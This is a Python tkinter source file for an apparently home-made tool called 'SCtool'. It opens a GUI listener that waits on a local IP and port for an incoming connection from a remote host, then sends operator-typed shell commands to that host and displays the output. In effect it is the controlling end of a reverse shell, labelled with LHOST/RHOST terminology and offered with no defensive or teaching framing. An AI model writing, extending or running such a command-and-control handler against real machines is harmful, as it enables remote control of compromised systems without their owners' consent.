import socket
import tkinter as tk
from threading import Thread

global default_Lip,default_Lport,Lip,Lport
default_Lip = '127.0.0.1'
default_Lport = 9999
Lip=''
Lport = 0

global con_flag,start_flag
con_flag = 0
start_flag = 0

class start_thread(Thread):
    def run(self):
        global ip_port,conn
        if (Lip=='')&(Lport==0):
            ip_port = (default_Lip, default_Lport)
        else:
            ip_port = (Lip,Lport)
            show_command.insert('end','Setting Done!\n')
        ready = ("[+] Setting Done!")
        show_command.insert('end',ready+'\n')
        start_button.config(state = tk.NORMAL)
        global start_flag
        start_flag = 1

class con_thread(Thread):
    def run(self):
        ready = ("[+] Wating...")
        show_command.insert('end',ready+'\n')
        global sk,conn,address
        sk = socket.socket()
        sk.bind(ip_port)

        sk.listen(5)
        conn, address = sk.accept()
        start_button.config(state = tk.NORMAL)
        global con_flag
        con_flag = 1
        connect_and_start = "[+] Connect\n"
        connect_and_start += "[+] Information:\n"
        connect_and_start += "[+] LHOST IP:"+str(ip_port[0])+'\n'
        connect_and_start += "[+] LHOST Port:"+str(ip_port[1])+'\n'
        connect_and_start += "[+] RHOST IP:"+str(address[0])+'\n'
        connect_and_start += "[+] RHOST Port:"+str(address[1])+'\n'
        connect_and_start += "[+] Can Type Command!"
        show_command.insert('end',connect_and_start + '\n')

def help_button():
    show_help = "[+] Help:\n"
    show_help += "[+] Can Type Command!"
    show_command.insert('end',show_help + '\n')
        
def set_Lip_and_Lport():
    global Lip,Lport
    Lip = type_ip.get()
    Lport = type_port.get()
    if (Lip== '')|(Lport==0):
        Lip = default_Lip
        Lport = default_Lport
        show_command.insert('end','IP and Port not change!\n')
    else:
        Lip = type_ip.get()
        Lport = type_port.get()
        show_command.insert('end','IP and Port Settng Done!\n')
        show_command.insert('end','Set IP:'+Lip+'\n')
        show_command.insert('end','Set Port:'+Lport+'\n')


def start():
    if start_flag == 0:
        start_button.config(state = tk.DISABLED)
        start_thread(daemon = True).start()
    elif start_flag == 1:
        show_command.insert('end','Started\n')
    
    
def con():
    if con_flag == 0:
        connect_button.config(state = tk.DISABLED)
        con_thread(daemon = True).start()
    else:
        show_command.insert('end','Need Start\n')

def send_command_fuc():
    if start_flag == 0:
        show_command.insert('end',"Need Start\n")
    elif con_flag == 0:
        show_command.insert('end',"Need Connect\n")
    elif con_flag == 1:
        show_something = enter_command.get()
        show_command.insert('end','command send '+show_something+'\n')
        data = show_something+" && echo [+] Command Request Done!"
        if data == 'exit'+" && echo [+] Command Request Done!":
            conn.send(data.encode())
            show_command.insert('end',"[X] Connect Close"+'\n')
            conn.close()
        elif data == 'help'+" && echo [+] Command Request Done!":
            show_command.insert('end',"exit to quit"+'\n')
        elif data != '':
            conn.send(data.encode())
            show_command.insert('end',(conn.recv(4096).decode('big5'))+'\n')
        elif data == ' && echo [+] Command Request Done!':
            show_command.insert('end',"pls enter"+'\n')

window = tk.Tk()
window.geometry('800x500')
window.title("SCtool- created by hurosu")
command_text = tk.Label(window,text="command:").grid(row=1)
enter_command = tk.Entry(window,show = None)
enter_command.grid(row=1,column=1)
command_button = tk.Button(window,text='send',command=send_command_fuc)
command_button.grid(row=1,column=2)
start_button = tk.Button(window,text='start',command=start)
start_button.grid(row=2,column=6)
connect_button = tk.Button(window,text='connect',command=con)
connect_button.grid(row=3,column=4)
show_command = tk.Text(window,width=60,height=30)
show_command.grid(row=3,column=0,columnspan=3)
ip_address = tk.Label(window,text="LHOST IP:").grid(row=1,column=4)
open_port = tk.Label(window,text="LHOST PORT:").grid(row=2,column=4)
type_ip = tk.Entry(window,show = None)
type_ip.grid(row=1,column=5)
type_port = tk.Entry(window,show = None)
type_port.grid(row=2,column=5)
set_ip_port = tk.Button(window,text="Set",command=set_Lip_and_Lport).grid(row=1,column=6)
help_button = tk.Button(window,text='help',command=help_button)
help_button.grid(row=3,column=5)
show_connect_information = tk.Listbox(window)
show_connect_information.grid(row=3,column=4,sticky=tk.S,ipadx=15,ipady=5,columnspan=2,padx=15)
show_connect_information.insert(1,Lip)
show_connect_information.insert(2,Lip)
window.mainloop()
